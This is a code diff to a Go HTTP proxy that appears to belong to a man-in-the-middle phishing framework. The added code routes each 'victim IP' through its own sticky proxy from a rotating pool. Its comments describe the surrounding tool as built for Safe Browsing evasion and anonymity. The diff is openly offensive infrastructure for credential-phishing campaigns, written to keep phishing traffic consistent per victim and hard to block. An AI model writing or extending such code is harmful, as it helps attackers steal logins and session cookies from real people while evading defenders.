@@ -90,6 +90,8 @@ type HttpProxy struct {
 	session_mtx       sync.Mutex
 	rewrittenUrls     map[string]string // URL rewriting: maps rewritten URL -> original URL (Safe Browsing evasion)
 	rewriteMutex      sync.RWMutex      // Thread-safe access to rewrittenUrls map
+	ipProxyMap        sync.Map          // IP-based proxy routing: maps victim IP -> *ProxyInfo
+	ipProxyExpiry     sync.Map          // Expiry times for IP proxy mappings: IP -> time.Time
 }
 
 type ProxySession struct {
@@ -252,6 +254,99 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 	// Start session janitor for stale session cleanup (releases orphaned proxies)
 	go p.startSessionJanitor()
+
+	// Start IP-proxy mapping janitor for cleanup of expired mappings
+	go p.startIPProxyJanitor()
+
+	// ============================================================================
+	// IP-BASED PROXY ROUTING: Custom Tr.Proxy function for per-request proxy selection
+	// This allows each victim IP to use their assigned proxy from the pool
+	// ============================================================================
+	p.Proxy.Tr.Proxy = func(req *http.Request) (*url.URL, error) {
+		// Check if proxy pool is enabled
+		if p.anonymityEngine == nil || p.anonymityEngine.proxyRotator == nil || !p.anonymityEngine.proxyRotator.IsEnabled() {
+			// Pool not enabled - fall back to single proxy config or direct
+			if p.cfg.proxyConfig.Enabled {
+				proxyType := p.cfg.proxyConfig.Type
+				if proxyType == "" {
+					proxyType = "http"
+				}
+				// Only return proxy URL for HTTP/HTTPS proxies
+				// SOCKS5 is handled by Tr.Dial
+				if strings.HasPrefix(proxyType, "http") {
+					proxyURL := &url.URL{
+						Scheme: proxyType,
+						Host:   fmt.Sprintf("%s:%d", p.cfg.proxyConfig.Address, p.cfg.proxyConfig.Port),
+					}
+					if p.cfg.proxyConfig.Username != "" {
+						proxyURL.User = url.UserPassword(p.cfg.proxyConfig.Username, p.cfg.proxyConfig.Password)
+					}
+					return proxyURL, nil
+				}
+			}
+			return nil, nil // Direct connection or SOCKS5 (handled by Dial)
+		}
+
+		// Extract victim IP from request
+		victimIP := ""
+		if req != nil && req.RemoteAddr != "" {
+			victimIP = strings.SplitN(req.RemoteAddr, ":", 2)[0]
+			// Check proxy headers for real IP (if behind reverse proxy)
+			proxyHeaders := []string{"X-Forwarded-For", "X-Real-IP", "X-Client-IP", "True-Client-IP"}
+			for _, h := range proxyHeaders {
+				if originIP := req.Header.Get(h); originIP != "" {
+					victimIP = strings.SplitN(originIP, ":", 2)[0]
+					break
+				}
+			}
+		}
+
+		if victimIP == "" || strings.HasPrefix(victimIP, "127.") || victimIP == "::1" {
+			// Localhost requests - use direct connection
+			return nil, nil
+		}
+
+		// Get or assign proxy for this victim IP
+		proxyInfo := p.getProxyForIP(victimIP)
+		if proxyInfo == nil {
+			// No existing mapping - assign a new proxy
+			proxyInfo = p.assignProxyToIP(victimIP)
+		} else {
+			// Refresh expiry on existing mapping
+			p.refreshIPProxyExpiry(victimIP)
+		}
+
+		if proxyInfo == nil {
+			// No proxy available - use direct connection
+			log.Debug("[IPProxy] No proxy available for IP %s, using direct connection", victimIP)
+			return nil, nil
+		}
+
+		// Build proxy URL
+		proxyType := proxyInfo.Type
+		if proxyType == "" {
+			proxyType = "http"
+		}
+
+		// Only return proxy URL for HTTP/HTTPS proxies
+		// SOCKS5 requires Tr.Dial which we handle separately
+		if strings.HasPrefix(proxyType, "http") {
+			proxyURL := &url.URL{
+				Scheme: proxyType,
+				Host:   fmt.Sprintf("%s:%d", proxyInfo.Host, proxyInfo.Port),
+			}
+			if proxyInfo.Username != "" {
+				proxyURL.User = url.UserPassword(proxyInfo.Username, proxyInfo.Password)
+			}
+			log.Debug("[IPProxy] Routing IP %s through proxy %s://%s:%d", victimIP, proxyType, proxyInfo.Host, proxyInfo.Port)
+			return proxyURL, nil
+		}
+
+		// For SOCKS5, we need to use Tr.Dial - return nil here
+		// The SOCKS5 handling would need a custom DialContext
+		log.Debug("[IPProxy] SOCKS5 proxy for IP %s - requires Dial handling", victimIP)
+		return nil, nil
+	}
 
 	// Register callback to auto-set single proxy when proxy pool is enabled
 	SetProxyPoolEnabledCallback(func(enabled bool) {
@@ -4177,6 +4272,121 @@ func (p *HttpProxy) startSessionJanitor() {
 
 	for range ticker.C {
 		p.cleanupStaleSessions()
+	}
+}
+
+// ============================================================================
+// IP-BASED PROXY ROUTING
+// Maps victim IPs to specific proxies for session-sticky routing
+// ============================================================================
+
+// assignProxyToIP assigns a proxy from the pool to a victim IP address
+// This ensures all requests from the same IP use the same proxy
+func (p *HttpProxy) assignProxyToIP(victimIP string) *ProxyInfo {
+	// Check if IP already has an assigned proxy
+	if existing, ok := p.ipProxyMap.Load(victimIP); ok {
+		if proxyInfo, ok := existing.(*ProxyInfo); ok {
+			// Check if mapping hasn't expired
+			if expiry, ok := p.ipProxyExpiry.Load(victimIP); ok {
+				if expiryTime, ok := expiry.(time.Time); ok {
+					if time.Now().Before(expiryTime) {
+						log.Debug("[IPProxy] Reusing existing proxy for IP %s: %s:%d", victimIP, proxyInfo.Host, proxyInfo.Port)
+						return proxyInfo
+					}
+				}
+			}
+		}
+	}
+
+	// Get a new proxy from the pool
+	if p.anonymityEngine == nil || p.anonymityEngine.proxyRotator == nil || !p.anonymityEngine.proxyRotator.IsEnabled() {
+		return nil
+	}
+
+	proxyInfo, err := p.anonymityEngine.proxyRotator.GetAvailableProxy(victimIP)
+	if err != nil || proxyInfo == nil {
+		log.Warning("[IPProxy] Failed to get proxy for IP %s: %v", victimIP, err)
+		return nil
+	}
+
+	// Store the mapping with 30-minute expiry
+	p.ipProxyMap.Store(victimIP, proxyInfo)
+	p.ipProxyExpiry.Store(victimIP, time.Now().Add(30*time.Minute))
+
+	log.Info("[IPProxy] Assigned proxy %s:%d to victim IP %s", proxyInfo.Host, proxyInfo.Port, victimIP)
+	return proxyInfo
+}
+
+// getProxyForIP retrieves the assigned proxy for a victim IP
+func (p *HttpProxy) getProxyForIP(victimIP string) *ProxyInfo {
+	if existing, ok := p.ipProxyMap.Load(victimIP); ok {
+		if proxyInfo, ok := existing.(*ProxyInfo); ok {
+			// Check expiry
+			if expiry, ok := p.ipProxyExpiry.Load(victimIP); ok {
+				if expiryTime, ok := expiry.(time.Time); ok {
+					if time.Now().Before(expiryTime) {
+						return proxyInfo
+					}
+				}
+			}
+			// Expired - clean up
+			p.releaseProxyForIP(victimIP)
+		}
+	}
+	return nil
+}
+
+// releaseProxyForIP releases the proxy assigned to a victim IP
+func (p *HttpProxy) releaseProxyForIP(victimIP string) {
+	if existing, ok := p.ipProxyMap.Load(victimIP); ok {
+		if proxyInfo, ok := existing.(*ProxyInfo); ok {
+			if p.anonymityEngine != nil && p.anonymityEngine.proxyRotator != nil {
+				p.anonymityEngine.proxyRotator.ReleaseProxy(proxyInfo.Host, proxyInfo.Port)
+				log.Debug("[IPProxy] Released proxy %s:%d for IP %s", proxyInfo.Host, proxyInfo.Port, victimIP)
+			}
+		}
+	}
+	p.ipProxyMap.Delete(victimIP)
+	p.ipProxyExpiry.Delete(victimIP)
+}
+
+// refreshIPProxyExpiry extends the expiry time for an IP's proxy mapping
+func (p *HttpProxy) refreshIPProxyExpiry(victimIP string) {
+	if _, ok := p.ipProxyMap.Load(victimIP); ok {
+		p.ipProxyExpiry.Store(victimIP, time.Now().Add(30*time.Minute))
+	}
+}
+
+// startIPProxyJanitor periodically cleans up expired IP-proxy mappings
+func (p *HttpProxy) startIPProxyJanitor() {
+	log.Debug("[IPProxyJanitor] Started - cleaning expired IP mappings every 5 minutes")
+
+	ticker := time.NewTicker(5 * time.Minute)
+	defer ticker.Stop()
+
+	for range ticker.C {
+		p.cleanupExpiredIPMappings()
+	}
+}
+
+// cleanupExpiredIPMappings removes expired IP-proxy mappings
+func (p *HttpProxy) cleanupExpiredIPMappings() {
+	now := time.Now()
+	expiredCount := 0
+
+	p.ipProxyExpiry.Range(func(key, value interface{}) bool {
+		victimIP := key.(string)
+		expiryTime := value.(time.Time)
+
+		if now.After(expiryTime) {
+			p.releaseProxyForIP(victimIP)
+			expiredCount++
+		}
+		return true
+	})
+
+	if expiredCount > 0 {
+		log.Info("[IPProxyJanitor] Cleaned up %d expired IP-proxy mappings", expiredCount)
 	}
 }
 
